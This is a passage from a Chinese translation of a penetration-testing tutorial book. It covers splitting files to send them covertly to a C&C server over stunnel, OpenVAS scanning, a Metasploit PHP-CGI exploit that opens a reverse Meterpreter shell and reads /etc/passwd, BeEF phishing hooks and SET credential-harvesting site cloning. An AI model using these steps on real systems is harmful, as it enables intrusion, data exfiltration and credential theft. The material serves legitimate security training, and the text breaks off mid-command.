  ## 文件实用工具


  有一些很棒的文件实用工具可以确保文件尽可能压缩。我倾向于依赖能够压缩的文件实用工具；如果压缩没有帮助，那么它们应该能够将文件拆分为更易管理的部分。这些实用工具包括
  tar、Zip/Unzip 和 Split。


  ## 使用 tar


  tar 是大多数 Linux 发行版默认安装的最有用的工具之一。tar 具有强大的功能；然而，由于可以使用大量开关，它的学习曲线可能有点陡峭。


  要使用 tar 压缩文件，我倾向于使用以下命令：


  ```

  tar -zcvf <newfilename.tar.gz> <filetobcompressed>

  ```


  -z 将使用 gzip 进一步压缩生成的 tar 文件。-v 打开详细模式，以便我可以看到正在发生的事情。-c 标志将压缩文件，最后 -f 开关会通知 tar
  我将指定要压缩的文件。以下是使用 tar 压缩的工作示例：


  ```

  JABELTRA-M-V0B5:~ jabeltra$ tar -zcvf system.log.tar.gz system.log

  a system.log

  ```


  要解压缩文件，设置非常相似，只需更改一个开关。以下是解压缩 zip 文件时我使用的语法：


  ```

  tar -xvf <compressed file>

  ```


  这里唯一的区别是使用 -x，这会让 tar 知道文件将被提取。以下是 tar 用于解压缩或提取文件的示例截图：


  ```

  JABELTRA-M-V0B5:~ jabeltra$ tar -xvf system.log.tar.gz

  x ./._system.log

  x system.log

  ```


  ## Split 实用工具


  Split 是一个非常方便的实用工具，可在将文件传输到我们的 C&C 服务器之前将其拆分为更易管理的块。这将使我们在带宽和在线时间方面更高效，并尽可能不被察觉。有人注意到持续的
  1 MBps 与持续的 10 MBps 峰值的情况不太可能。


  split 实用工具非常易于使用。要使用此命令，你输入 split 命令，后跟每个文件的大小、要拆分的文件以及拆分文件的最终名称：


  ```

  split -b <size k|m> <filetobesplit> <nameofsplitfiles>

  ```


  在以下截图中，我将把名为 system.log 的日志文件拆分为更易管理的 1 MB 大小，并命名为 system.log.split。这最终会创建四个名为 system.log.splitaa-system.log.splitad
  的文件。然后我只需使用我的传输脚本通过 stunnel 隧道安全地将文件传输到我的 C&C 服务器：


  ```

  JABELTRA-M-V0B5:~ jabeltra$ split -b 1m system.log system.log.split

  JABELTRA-M-V0B5:~ jabeltra$ ls -al | grep system.log.split

  -rw-r--r-- 1 jabeltra staff 1048576 Jan 22 17:38 system.log.splitaa

  -rw-r--r-- 1 jabeltra staff 1048576 Jan 22 17:38 system.log.splitab

  -rw-r--r-- 1 jabeltra staff 1048576 Jan 22 17:38 system.log.splitac

  -rw-r--r-- 1 jabeltra staff 1003173 Jan 22 17:38 system.log.splitad

  ```


  要在另一端将其全部重新组合，我使用 cat 命令。此实用工具基本上将文件重新连接回一个文件。语法如下：


  ```

  cat <fileaa fileab fileac filead> > <final file name>

  ```


  这是我在远程端重新组合文件的截图：


  ```

  JABELTRA-M-V0B5:~ jabeltra$ cat system.log.splitaa system.log.splitab system.log.splitac
  system.log.splitad > system.log

  JABELTRA-M-V0B5:~ jabeltra$ ls -al | grep system.log

  -rw-r--r-- 1 jabeltra staff 4148901 Jan 22 17:42 system.log

  ```




  ## Summary


  本章开始时向我提出的挑战是能够创建一条安全隧道来将我们的证据转移到外部，同时确保能够绕过任何潜在的安全设备。我还需要一种方法，能够从我的 C&C 服务器重新进入环境，而无需公司创建相关的防火墙访问控制规则和
  NAT 规则。


  利用 stunnel 和反向 ssh，我实现了这一目标。stunnel 让我能够在内部服务器和外部 C&C 服务器之间建立一条 SSL 隧道。SSL 隧道至关重要，因为大多数防火墙会允许出站
  SSL，而大多数 IPS 设置不会解密负载，因此它可以在不被检查的情况下通过。反向 ssh 隧道允许 C&C 服务器搭载已从内部服务器发起的已建立 ssh 连接。自动化这一过程使得在
  Raspberry Pi 重启时整个设置能够恢复。


  使用我创建的脚本，我能够将文件传输到正确的目录，并将每次传输记录到日志文件以供审计。为了充分利用这条隧道，我讨论了如何压缩和分割文件，以及如何在另一端将它们重新组合起来。


  在下一章，我将直接进入渗透测试，通过对一些目标进行漏洞扫描，然后尝试使用 Metasploit 等工具利用这些漏洞。我还将深入用户侧的利用，研究 BeEF 用于基于浏览器的利用以及
  SET。

  '
- "## 4 Vulnerability Scanning and Metasploit\n\n现在开始有趣的部分怎么样！在完成工具和系统的设置以及必要的情报收集后，现在是时候开始利用我们收集到的数据了。本章的重点将是扫描环境中的漏洞，然后尝试使用\
  \ Metasploit 等工具利用这些漏洞。我们还将通过使用名为 **Browser Exploitation Framework (BeEF)** 和 **Social\
  \ Engineering Toolkit (SET)** 的工具来探索用户侧。\n\n本章将涵盖以下主题：\n\n- 漏洞扫描工具\n- 扫描技术\n- OpenVAS\n\
  - 开始使用 OpenVAS\n- 对环境执行扫描\n- 开始使用 Metasploit\n- 使用 Metasploit 利用目标\n- 使用 BeEF 进行基于浏览器的利用\n\
  - 使用 SET 进行客户端攻击\n\n## Vulnerability scanning tools\n\n有很多种漏洞扫描工具。有些是商业产品，需要付费。这些产品通常具有精致的\
  \ GUI，使用方便且报告功能强大。其中包括 Rapid7、Qualys 和 Tenable 等扫描器。还有一些是免费的。其中包括 OpenVAS、Retina\
  \ CS 和 Nexpose 等产品。这些免费工具通常使用起来并不那么容易，也不一定具有付费版本那么多的功能。然而，根据我的经验，OpenVAS 是一个很棒的免费工具。Nessus\
  \ 曾是最受欢迎的免费漏洞扫描器之一，直到它转为闭源，此后需要年度订阅。\n\n漏洞扫描器旨在扫描环境并查找网络参数范围内的已知漏洞。根据产品不同，漏洞扫描器产品中可能包含\
  \ 10,000 多个可用于针对目标的已知漏洞。这些类型的漏洞包括网络、Web 应用、数据库、基于主机的、基于浏览器的，或仅仅是一个简单的端口扫描器。过去几年里，许多公司由于保持安全环境压力增大而在内部采用了漏洞扫描器。鉴于泄露对公司可能造成的灾难性影响，安全已成为每个人的首要关注点；如果不是，现在也将是。\n\
  \n厂商甚至意识到漏洞扫描器在组织中的重要性，并开始在其产品中构建漏洞扫描器的集成。我最期待的其中之一是 Cisco 与其 **Identity Services\
  \ Engine (ISE)** 和第三方漏洞扫描器的集成。有了 ISE，你可以使用机器获得的漏洞评分作为决定因素，判断该系统是否可以放置在网络上的正确 VLAN\
  \ 中，或是否需要推送到隔离 VLAN。我认为随着越来越多的公司将漏洞扫描作为正常的业务安全功能采用，这种集成只会增长。合规性在推动漏洞扫描方面也发挥着巨大作用，因为\
  \ PCI-DSS 等标准要求定期进行扫描。\n\n每个漏洞的目标都是在坏人之前找到它们。它们的设计不是使任何系统瘫痪，而是只是报告它们（与我们稍后使用 Metasploit\
  \ 所做的不同）。由于它们执行的测试数量庞大，通常运行时间很长，因此请适当规划。它们还应定期安排。通常是每季度一次；然而，如果你处于高变更环境中，你可能希望更频繁地执行，或也许只是在较大变更后执行。\n\
  \n![](img/095df2cd1930baecbcecaa51ee3417aa_82_0.png)\n\n你不希望一次变更在你的环境中打开一个漏洞。\n\n\
  ## Scanning techniques\n\n组织执行的两种主要扫描技术是内部和外部漏洞测试。你可能认为它们之间并没有太大区别，但这通常是一个误解。外部扫描是通过试图进入你环境的外部人员的视角进行的。因此，它们将与任何面向公众的服务所使用的所有系统进行交互。这将包括公共网站和面向公众的服务。它们旨在测试外部用户可以访问的内容。因此，你的外部防火墙上入站流量的\
  \ ACL 越小，你的攻击面就越小。始终锁定防火墙，只包含必要的服务和端口。外部扫描通常通过批准的扫描供应商或 ASV 进行测试。\n\n另一方面，内部扫描旨在查找内部系统中的漏洞。通常，在这种测试中，漏洞扫描器可以完全访问系统。原因在于这些测试是查找系统内的任何问题，而不仅仅是可达的问题。内部扫描通常由内部安全人员执行，除非组织没有此类人员。如果是这种情况，那就是我们可以介入的地方。一些组织还有内部设备不断运行扫描并为管理层生成报告。这往往是这种情况，因为内部系统比面向公众的服务变更更频繁。\n\
  \n## OpenVAS\n\n在完成漏洞扫描的背景信息后，让我们深入漏洞扫描的核心并开始检查一些主机。如我之前提到的，有大量漏洞扫描产品。然而，对于我的实验室，我将使用\
  \ OpenVAS，这是一个免费的开源工具。\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_83_0.png)\n\n\
  即使我们在本实验室中使用 OpenVAS，也不要认为这是必需的扫描器。如果你订阅了一些付费扫描器，或更喜欢使用其他工具，请随意使用。扫描的语法、执行和流程可能不同；然而总体结果应该相同。\n\
  \nOpenVAS 是 Nessus 产品的一个分支，因此它有着悠久的历史。OpenVAS 是一个功能极其强大的扫描器，但可能很难上手。OpenVAS 有一个明确的结构，如图所示：\n\
  \n![](img/095df2cd1930baecbcecaa51ee3417aa_84_0.png)\n\n网络漏洞测试，或 NVT，是被引入扫描器用于扫描的定义测试，最终会产生存储的结果。OpenVAS\
  \ 有一个很棒的功能，即这些 NVT 通过 feed 服务添加和更新。这确保你始终拥有最新的 feed。截至 2016 年中，OpenVAS 中有 47,000\
  \ 多个 NVT。这些插件真正使 OpenVAS 成为一个功能强大且灵活的工具。如果发现新的漏洞，有人会制作此插件，然后你可以将其加载到系统中以在网络上扫描它。这展示了\
  \ OpenVAS 的开放性和强大性。\n\n## Getting started with OpenVAS\n\n安装 OpenVAS 时，你会注意到它有很多组成部分。因此，初次使用\
  \ OpenVAS 时可能会感到不知所措。然而，一旦你熟悉它并理解其流程，它就是一个相当强大的产品。\n\n安装 OpenVAS 后，你需要运行设置脚本来完成各种需要完成的任务。这可以通过方便的\
  \ `openvas-setup` CLI 命令完成。这将确保你的 OpenVAS 设置已完全就绪，并且是最新的规则：\n\n```\n[i] Will use\
  \ wget\n[i] Using GNU wget: /usr/bin/wget\n[i] Configured NVT http feed: http://www.openvas.org/openvas-nvt-feed-current.tar.bz2\n\
  [i] Downloading to: /tmp/openvas-nvt-sync.GSNdJ1PXPO/openvas-feed-2017-01-24-11451.tar.bz2\n\
  ```\n\n接下来，你需要确保必要的服务正在运行并监听正确的端口。你最后想做的事情就是开始工作，然后花上数小时排查一个已停止的服务。你需要确保三个服务正在运行，它们分别是管理器、扫描器和\
  \ GSAD 服务。使用 netstat 命令，我们将在尝试连接之前验证这些服务是否正在监听：\n\n```\nroot@kali:/etc/ssh# netstat\
  \ -antp\nActive Internet connections (servers and established)\nProto Recv-Q Send-Q\
  \ Local Address           Foreign Address         State       PID/Program name\n\
  tcp        0      0 127.0.0.1:9390          0.0.0.0:*               LISTEN     \
  \ 23062/openvasmd\ntcp        0      0 127.0.0.1:9391          0.0.0.0:*       \
  \        LISTEN      23030/openvasd: Wa\ntcp        0      0 127.0.0.1:80      \
  \      0.0.0.0:*               LISTEN      23071/gsad\ntcp        0      0 127.0.0.1:9392\
  \          0.0.0.0:*               LISTEN      23068/gsad\n```\n\n如果由于某种原因你没有打开这些服务，你可以通过\
  \ openvas-start 命令手动启动 OpenVAS：\n\n```\nroot@kali:~# openvas-start\nStarting OpenVas\
  \ Services\nroot@kali:~# netstat -antp\nActive Internet connections (servers and\
  \ established)\nProto Recv-Q Send-Q Local Address           Foreign Address    \
  \     State       PID/Program name\ntcp        0      0 127.0.0.1:9390         \
  \ 0.0.0.0:*               LISTEN      1692/openvasmd\ntcp        0      0 127.0.0.1:9391\
  \          0.0.0.0:*               LISTEN      1729/openvasd: Rel\ntcp        0\
  \      0 127.0.0.1:9392          0.0.0.0:*               LISTEN      1683/gsad\n\
  tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN     \
  \ 1707/gsad\ntcp        0      0 0.0.0.0:22              0.0.0.0:*             \
  \  LISTEN      590/sshd\ntcp        0      0 192.168.33.27:22        192.168.33.3:49389\
  \      ESTABLISHED 1635/sshd: root@pts\ntcp6       0      0 :::22              \
  \     :::*                    LISTEN      590/sshd\n```\n\n如果一切检查正常，你应该能够打开浏览器并通过管理端口\
  \ 9392 连接到管理器。以下是我的 Web 界面的截图：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_86_0.png)\n\
  \n你将使用 admin 用户和在设置期间生成的密码登录。登录后，你将导航到主屏幕，在那里你可以开始执行漏洞扫描。此屏幕显示任务向导，这是一个快速扫描选项：\n\
  \n![](img/095df2cd1930baecbcecaa51ee3417aa_87_0.png)\n\n## 对环境执行扫描\n\n在开始使用 OpenVAS\
  \ 进行扫描流程之前，让我们先谈谈不同类型的扫描。你会注意到有很多类型，其中包括提及以下关键词 full、deep、fast 和 ultimate 的扫描。当我第一次浏览它们时，我对它们的区别感到困惑。OpenVAS\
  \ 文档对这些选项的描述做得非常好：\n\n- **Full and fast**：此扫描利用大多数 NVT 并使用之前收集的信息。\n- **Full and\
  \ fast completed**：此扫描利用大多数 NVT 并同样使用之前收集的信息。然而，其中一些检查可能会导致服务/远程系统关闭。\n- **Full\
  \ and very deep**：此扫描利用大多数 NVT，但速度较慢，因为它不使用之前收集的信息。\n- **Full and very deep ultimate**：此扫描利用大多数\
  \ NVT，但不使用之前收集的信息，因此速度较慢。其中一些可能会导致服务/远程系统关闭。\n\n开始漏洞扫描时，你只需在 **Quick start** 框中输入\
  \ IP 地址：\n\n- 1. 在此框中添加 IP 地址后，你可以点击 **Start Scan** 按钮，你将看到一个与以下截图类似的任务被创建：\n\n\
  ![](img/095df2cd1930baecbcecaa51ee3417aa_88_0.png)\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_88_1.png)\n\
  \n此任务应在一两分钟内开始，具体取决于所需的资源。\n\n- 2. 一旦扫描开始，你会看到进度条开始变绿并显示完成百分比。在扫描期间，你可以随时点击扫描名称，你将看到当前报告。此报告将显示所有已完成的测试以及未完成的测试。你当然可以在其中按\
  \ **Severity** 过滤，以便对出现的任何漏洞有一个大致了解。我通常启动扫描然后转去做其他事情，因为扫描可能需要一段时间，具体取决于你从哪个主机扫描。一旦完成，你将看到任务状态为\
  \ **Done**。你还会看到报告的严重程度以及其他信息：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_88_2.png)\n\
  \n- 3. 点击 Reports 还会分解扫描期间发现的不同严重级别。这描绘了一幅漂亮的图片（在这种情况下并不那么漂亮），说明该主机有多么严重地易受攻击：\n\
  \n![](img/095df2cd1930baecbcecaa51ee3417aa_89_0.png)\n\n- 4. 要真正深入了解报告的细节，只需点击 Date。这会带你进入报告本身。进入后，你可以点击\
  \ Severity 列按最高严重程度排序。这样你就可以优先处理需要响应的内容：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_89_1.png)\n\
  \n- 5. 你还可以点击 Vulnerability name 来查看该漏洞具体是什么。例如，以下是系统中发现的一个漏洞的描述：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_90_0.png)\n\
  \n- 6. OpenVAS 的另一个出色功能是如果它知道修复方法，就会显示潜在的修复方案。这是名称为拼图块的列。如果你发现其中一个你易受攻击的漏洞有修复图标，你可以在漏洞的详细信息中查看是否存在厂商修复、变通方法、无可用修复或任何缓解技术。\n\
  \n- 7. 现在，你已经拥有了所有相关信息，可以开始使用 Metasploit 来针对这些漏洞。然而，在你深入之前，你希望确保继续保持强大的安全配置；因此你将自动化这些扫描，以确保它们持续进行，并在发现具有特定严重级别的漏洞时提醒你。为此，导航到配置和计划并创建一个新的每周计划：\n\
  \n![](img/095df2cd1930baecbcecaa51ee3417aa_90_1.png)\n\n- 8. 接下来，你需要设置警报。为此，导航到\
  \ **Configuration** 并选择 **Alerts**。在警报屏幕上，你需要创建一个新的警报。进入后，你可以按任意方式配置警报。我的设置是当严重程度分数为\
  \ **5.0** 及以上时发出警报：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_91_0.png)\n\n- 9.\
  \ 最后，在完成任务设置准备之前，你需要配置你的目标。这在 **Configuration | Target** 菜单中完成。在这里，你将为 **My LAMP\
  \ Server** 创建一个新目标，填写 IP 地址和其他信息，然后保存目标。我的目标列表如下所示的配置：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_91_1.png)\n\
  \n- 10. 现在所有预工作都已完成，你需要进入 **Scan Management** 来设置扫描并应用计划和警报。为此，点击 **Scan Management**\
  \ 然后点击 **Tasks**。进入 **Tasks** 后，使用之前创建的所有变量创建一个新任务。这应该会带你进入可以输入要自动化的扫描任务所有信息的屏幕：\n\
  \n![](img/095df2cd1930baecbcecaa51ee3417aa_92_0.png)\n\n就这样，你现在将在特定主机上拥有一个可工作的计划任务，并且警报功能也已全部完成。你需要定期执行一些管理任务以确保\
  \ feed 为最新。在 **Administration** 菜单下，你需要点击三个 feed 选项以确保更新 feed。这样你就可以为任何扫描获得最新最好的内容。\n\
  \n你的扫描报告可能包含误报和漏报。误报是指报告显示某项是开放的，但实际上并非开放。这种情况有时会发生。其他测试应该能揭示该端口的真相。至于漏报，这是扫描器显示端口未开放，但实际上它是开放的情况。这些往往更危险，因为你会假设端口已关闭然后继续进行。进一步的测试和探测可以揭示这些端口的真相。\n\
  \n现在我们已经完成了漏洞测试并手握报告，让我们回顾漏洞报告并开始计划首先尝试利用哪个目标。这就是 **Metasploit** 登场的地方，它是我们渗透测试工具箱中的下一个工具。\n\
  \n\n\n## 开始使用 Metasploit\n\nMetasploit 是一个用于对目标主机进行漏洞利用测试的强大框架。Metasploit 毫无疑问是漏洞利用测试中的事实标准。我们将利用从\
  \ OpenVAS 扫描中获得的信息尝试利用系统，以验证它们是否确实容易受到发现的那些漏洞的影响。然后我会将测试获得的结果纳入渗透测试报告中。这样公司内的管理层和相关利益相关者就可以在有补丁可用时修补漏洞，或创建必要的补偿控制措施。\n\
  \n目前 Metasploit 有四个版本可用：社区版、Express 版、Ultimate 版和 Pro 版。社区版是免费的，但由于它是免费的，因此存在限制。随着更多功能和能力的增加，其他版本的成本也会增加。以下是\
  \ Rapid7 提供的各版本功能对比的详细介绍，Rapid7 是在 2009 年收购 Metasploit 框架的公司：\n\n```\nhttps://help.rapid7.com/metasploit/Content/getting-started/product-editions.html\n\
  ```\n\n我将在所有测试中使用社区版，因为它免费使用，并且允许任何想跟随本书示例的人一起学习。\n\nMetasploit 框架基于模块。你使用这些模块对目标执行各种任务。这些模块包括以下内容：\n\
  \n- **Exploits**：这些是尝试利用系统已知漏洞的代码。\n- **Payload**：这些是会在远程系统上留下痕迹的代码。\n- **Encoders**：这些有助于将有效载荷传输到远程系统，通过帮助绕过其路径上的任何障碍。\n\
  - **Nops**：意为无操作。在 x86 架构中，它实际上意味着在一个周期内什么都不做。这使得 Metasploit 能够保持有效载荷大小一致。\n- **Post**：这些是在系统被入侵后可以使用的模块。\n\
  - **Auxiliary**：这些是其他不适合前述类别的模块。如果你从 msfconsole 执行 show auxiliary，可以看到各种类别，例如扫描器和模糊测试器。\n\
  \n我将使用 Metasploit 中的一些模块来尝试访问我的远程目标。\n\n## 使用 Metasploit 利用我们的目标\n\n现在，是时候尝试利用我们在漏洞扫描期间发现的一些目标了。这里\
  \ `msfconsole` 将成为我们新的好帮手。Msfconsole 是 Metasploit 的单窗格玻璃/集中式控制台。这是我使用 Metasploit\
  \ 的最喜欢的方式，因为它是少数几种可以访问产品中大多数功能的方式之一。\n\n要启动 `msfconsole`，只需打开一个终端窗口并输入 `msfconsole\
  \ --help`。现在，启动 `msfconsole` 时可以传递许多选项。以下是这些选项的截图：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_94_0.png)\n\
  \n然而，对于我的测试，我们只需在不带任何额外选项的情况下运行命令。为此，只需从命令行运行 `msfconsole`，你应该会进入 `msf` 提示符：\n\n\
  ![](img/095df2cd1930baecbcecaa51ee3417aa_95_0.png)\n\n进入 `msfconsole` 后，确实可能会让人感到畏惧。运行\
  \ `help` 命令会显示你拥有的所有选项。里面有很多很棒的东西，但从哪里开始呢？我做的第一件事是运行 `show exploits`。这样我就可以看到所有可用的漏洞利用。我想看看其中是否有任何一个与我在漏洞扫描中发现的内容相匹配。\n\
  \n我在漏洞报告中首先注意到的是目标服务器存在 PHP-CGI 问题。为了看看 Metasploit 中是否有相关内容，我登录 `msfconsole` 并搜索任何\
  \ `php-cgi` 漏洞利用。幸运的是，确实找到了一个。以下截图显示了此次搜索：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_95_1.png)\n\
  \n由于我想在漏洞利用报告中尽到应尽的责任，我查看了报告中“References”部分找到的链接。我想验证 msfconsole 中的漏洞利用是否与漏洞报告中的一致。在查看\
  \ http://www.kb.cert.org/vuls 后，我可以看到其披露日期与我在 msfconsole 中显示的相同。这些信息足以让我想要继续并验证漏洞：\n\
  \n![](img/095df2cd1930baecbcecaa51ee3417aa_96_0.png)\n\n由于我现在知道要使用的漏洞利用，我只需要告诉我的\
  \ msfconsole 使用该特定漏洞利用。加载漏洞利用的过程相当直接。\n\n使用关键字 use 和漏洞利用字符串，我的提示符应按如下方式更改漏洞利用：\n\
  \n```\nmsf > use exploit/multi/http/php_cgi_arg_injection\nmsf exploit(php_cgi_arg_injection)\
  \ >\n```\n\n现在在主动尝试漏洞利用之前，我必须指定目标主机。使用 show options 命令，我可以看到当前设置了哪些选项。在我的情况下，我的\
  \ RHOST 为空。这完全不是问题，因为我只需指定我的主机，即我们对其运行漏洞扫描的主机。我将使用 set RHOST 命令：\n\n```\nset RHOST\
  \ 192.168.87.130\n```\n\n以下截图显示了我实验室中的过程：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_97_0.png)\n\
  \n现在漏洞利用已加载，并且我已设置选项，是时候尝试利用了。这是有趣的部分。对主机运行漏洞利用使用 exploit 命令完成：\n\n```\nmsf exploit(php_cgi_arg_injection)\
  \ > exploit\n```\n\n一旦我按下 Enter，Metasploit 就会尝试使用指定的漏洞利用来利用目标主机。这可能需要一些时间，但等待是值得的：\n\
  \n```\nmsf exploit/php_cgi_arg_injection > exploit\n[*] Started reverse TCP handler\
  \ on 192.168.87.129:4444\n[*] Sending stage (34122 bytes) to 192.168.87.130\n[*]\
  \ Meterpreter session 1 opened (192.168.87.129:4444 -> 192.168.87.130:33595) at\
  \ 2017-01-27 10:15:00 -0500\n\nmeterpreter >\n```\n\n你可以在这里看到我们的漏洞利用是成功的。我们现在处于\
  \ meterpreter 提示符下。\n\nMeterpreter 基本上是一个动态有效载荷，使用内存注入，即交互式 shell。所有这些都是通过在漏洞利用期间建立的网络连接进行的。从这里，你可以对被入侵的系统做很多不同的事情。你可用的选项取决于你现在已控制的受损系统的类型。通常，你有以下类别的以下命令：\n\
  \n- 核心命令\n- 文件命令\n- 网络命令\n- 文件系统命令\n- 用户界面命令\n- 摄像头命令\n- 提权命令\n- 密码数据库命令\n- 时间戳命令\n\
  \nMeterpreter 通常不会被基于网络的入侵检测系统以及基于主机的入侵检测系统察觉。这使其成为在远程计算机上运行任务同时保持隐蔽的绝佳工具。\n\n现在，让我们看看能获取什么信息。我将尝试获取\
  \ passwd 文件，因为它总是包含一些有用的信息，而且在接下来的几天里我们需要它来进行一些密码攻击：\n\n```\nmeterpreter > cat /etc/passwd\n\
  root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\n\
  sys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\n\
  man:x:6:12:man:/var/cache/man:/bin/sh\n```\n\n之后，我还可以查看在被利用系统上以哪个用户身份运行：\n\n```\n\
  meterpreter > getuid\nServer username: www-data (33)\n```\n\n基于这些信息，我可以在渗透测试报告中明确写出该主机容易受到我们使用\
  \ OpenVAS 发现并通过 Metasploit 利用的特定 PHP-CGI 漏洞的影响。\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_99_0.png)\n\
  \n由于我只是想看看是否可以利用目标系统，我不会对目标系统进行任何更改或做任何恶意操作。Meterpreter 让你几乎可以做任何事情，包括上传和下载文件。我们的目的是找到、测试、验证并报告我们发现的内容，这就是我将要做的事情。\n\
  \n除了前面获取密码文件的示例之外，你还可以执行一些我认为非常强大的任务：\n\n- 获取 shell\n- 在目标主机上执行给定文件\n- 清除并保护远程事件日志\n\
  - 向目标主机上传或下载文件\n- 终止进程\n- 获取系统信息\n- 读取/写入/删除文件\n- 运行第三方创建的脚本，例如以下内容：\n  - 检查虚拟机\n\
  \  - 转储哈希文件\n  - 关闭杀毒软件\n  - 从目标主机收集你可能想要的任何内容\n\n\n\nThese are just some examples\
  \ of the power of meterpreter.\n\n## 了解客户端攻击\n\n客户端攻击变得越来越流行，因为它们有效，而且效果很好。它们利用了当前使用的客户端-服务器架构。这些客户端或终端运行完整的操作系统，并运行各种类型的应用程序。操作系统以及这些客户端上包含的应用程序都存在漏洞。这体现了补丁管理的重要性。\n\
  \n客户端攻击以不同的方式利用这些漏洞。在下面的示例中，我们使用 BeEF 来利用基于浏览器的攻击。然而，这并不是唯一的方法。你可以通过电子邮件或其他方法将文件放到机器上，以利用客户端的\
  \ Java 或 Adobe Reader，从而从该机器获取你想要的任何东西，或者在以后将其用于其他目的进行控制。选择权在你手中，这就是为什么不要忽视客户端攻击很重要。\n\
  \n## 使用 BeEF 进行基于浏览器的利用\n\n用于钓鱼攻击的最佳工具之一是 BeEF。BeEF 利用网络浏览器中发现的弱点进行客户端攻击。这些攻击劫持网络浏览器并将其用作桥头堡，以便直接攻击主机。这是一种非常简单的攻击，因为欺骗用户通常很容易。它表明确保浏览器已修补并保持最新非常重要。\n\
  \nBeEF 可以归入许多类别，但我认为它是一种利用工具，这也是我在实验室中使用它的方式。BeEF 是渗透测试人员非常流行的工具，因为它为我们提供了另一个测试向量；它超越了边界安全，并且不需要我们对终端目标更改任何安全或设置。它也是一个非常好的工具，可以通过查看谁点击了哪些虚假链接来测试用户对各种社会工程任务的反应。\n\
  \nBeEF 主要通过浏览器驱动，因此从 CLI 运行 beef-xss 将启动 BeEF，但其余配置将通过 Web 界面完成。再次说明了此工具使用起来有多么容易。\n\
  \n要在 CLI 上启动 BeEF，你需要进入 `/usr/share/beef-xss` 目录，并运行脚本 `./beef`。这将为你创建所有必要的绑定和监听器：\n\
  \n![](img/095df2cd1930baecbcecaa51ee3417aa_101_0.png)\n\n一旦 BeEF 启动并运行，你可以通过以下 URL\
  \ 在端口 3000 上连接它：\n\n```\nhttp://YOURBEEFSERVER:3000/ui/panel\n```\n\n**用户名：** beef\n\
  **密码：** beef\n\n这是主 BeEF 登录屏幕的截图，使用了前面给出的默认登录信息：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_102_0.png)\n\
  \n对于 BeEF 来说，一切都在于钩子。为了进入远程客户端的计算机，他们需要点击一个会“hook”他们并将他们与我们的 BeEF 服务器连接起来的链接。BeEF\
  \ 附带了一个示例钩子。它的位置在 http://YOURBEEFSERVER:3000/hook.js。我们的任务是让人们点击它。为此，我将为用户设置一封虚假的电子邮件供他们点击。这将涉及我创建一封电子邮件并将其发送给公司。\n\
  \n```\nhttp://YOURBEEFSERVER:3000/hook.js\n```\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_102_1.png)\n\
  \n这正是管理层支持和认可至关重要的地方。我将向每个人发送一个恶意链接，任何点击它的人都将被我攻破。现在由于这是一次测试，我只会记录谁点击了该链接。这样我就可以在参与结束时将电子邮件和网络安全培训作为交付成果的一部分提出建议。\n\
  \n我的示例电子邮件将简单直接；然而，它仍然需要欺骗用户点击链接。为此，我将起草一封关于即将举行的公司活动的逼真电子邮件，但链接不会指向签到表，而是指向 BeEF\
  \ 服务器页面，这将“hook”他们。\n\n这是我将发送给公司的电子邮件。你会看到链接指向我的 BeEF 服务器：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_103_0.png)\n\
  \n此链接将返回到我的 BeEF 服务器的 picnic.html 页面。发送电子邮件后，就只剩下等待了。随着用户点击此链接并被钩住到我的 BeEF 服务器，我将开始看到我的\
  \ BeEF 控制台因已被钩住的浏览器而亮起。让我们看看用户被钩住后我的 BeEF 控制台：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_103_1.png)\n\
  \n使用 **在线浏览器**，如果你选择一个主机，你可以看到可以针对该主机使用的所有模块。在以下示例中，我想检测是否有任何活跃的社交媒体网站。这不仅会显示哪些用户在工作时间使用社交媒体网站，更重要的是它会让我知道他们是否已连接，这样我就可以潜在地窃取他们的凭据。以下截图显示有一个活跃的网站：\n\
  \n![](img/095df2cd1930baecbcecaa51ee3417aa_104_0.png)\n\n## 使用 SET 进行客户端利用\n\nSET\
  \ 是一款专为创建基于社会工程的攻击向量而设计的工具。SET 可以非常快速地创建自定义攻击。你可以创建恶意有效载荷、QRcode-based 攻击和 Powershell\
  \ 攻击等等。你甚至可以在本地启动浏览器，创建恶意代码，并使用 Metasploit 进行投递。我将设置一个虚假网站，并在用户以为他们正在登录时窃取其凭据。我将向你展示它使用起来有多容易，以及为什么它是测试用户时我最喜欢的工具：\n\
  \n- 1. 我们要做的第一件事是启动 SET：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_104_1.png)\n\
  \n- 2. 从主菜单，有许多可用选项。由于我想创建 **社会工程攻击**，我将选择选项 1。一定要探索这个强大工具中的其他选项：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_105_0.png)\n\
  \n- 3. 从这里，我将选择选项 2。我使用此选项是因为我计划对用户使用网站攻击来破坏其终端：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_105_1.png)\n\
  \n- 4. 由于我将使用凭据收割，我将选择选项 3。这样获取用户的用户名和密码比尝试猜测或破解它们更容易。\n\n- 5. 对于下一个选项，我将选择选项 2，即\
  \ Site Cloner。我想确保我给用户一个他们会登录的页面。我需要让它尽可能真实：\n\n```\nset:webattack>2\n[-] Credential\
  \ harvester will allow you to utilize the clone capabilities within SET\n[-] to\
  \ harvest credentials or parameters from a website as well as place them into a\
  \ report\n[-] This option is used for what IP the server will POST to.\n[-] If you're\
  \ using an external IP, use your external IP for this\nset:webattack> IP address\
  \ for the IP back in Harvester/Tabnabbing:192.168.33.27\n[-] SET supports both HTTP\
  \ and HTTPS\n[-] Example: http://www.thisisafakesite.com\nset:webattack> Enter the\
